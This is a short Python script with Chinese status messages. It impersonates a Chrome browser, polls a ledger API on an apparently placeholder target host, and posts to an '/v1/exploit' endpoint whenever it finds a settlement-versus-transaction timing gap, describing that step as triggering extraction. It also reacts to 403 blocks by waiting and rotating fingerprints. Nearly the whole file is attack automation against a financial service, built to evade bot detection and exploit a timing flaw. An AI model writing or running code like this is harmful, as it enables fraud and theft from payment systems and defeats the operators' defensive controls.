import os
import time
import random
import atexit
from curl_cffi import requests as fake_browser

class AgentHands:
    def __init__(self):
        self.session = fake_browser.Session()
        self.target = "https://api.virus-group-target.internal"
        self.headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
            "Referer": "https://gateway.target-group.com/"
        }
        atexit.register(self.cleanup)

    def cleanup(self):
        self.session.close()

    def run(self):
        print("--- 小龍蝦系統：偵測模組已啟動 ---")
        while True:
            try:
                resp = self.session.get(f"{self.target}/v1/ledger", headers=self.headers, impersonate="chrome120")
                if resp.status_code == 200:
                    data = resp.json()
                    print(f"[*] 監控中... 當前數據: {data.get('status', 'OK')}")
                    if data.get("settlement_ts", 0) - data.get("transaction_ts", 0) > 500:
                        print("[!] 發現時間差漏洞！正在觸發提取...")
                        self.session.post(f"{self.target}/v1/exploit", json={"id": data.get("ledger_id")}, impersonate="chrome120")
                elif resp.status_code == 403:
                    print("[!] 遭阻斷，指紋輪替中...")
                    time.sleep(random.uniform(5, 10))
            except Exception as e:
                print(f"[!] 系統循環中: {e}")
                time.sleep(10)

if __name__ == "__main__":
    bot = AgentHands()
    bot.run()
